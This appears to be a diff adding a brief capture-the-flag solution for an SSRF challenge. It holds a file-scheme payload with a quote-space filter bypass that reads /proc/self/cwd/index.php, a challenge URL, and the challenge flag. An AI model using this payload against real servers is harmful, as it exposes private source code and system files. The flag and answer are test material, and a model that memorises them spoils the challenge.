@@ -1,0 +1,8 @@
+file' ':///proc/self/cwd/index.php
+
+
+http://dimitrust.oa.to:8080/archive.is/view/?no=646
+
+
+
+HCAMP{You_can_see_the_source_code_via_SSRF}
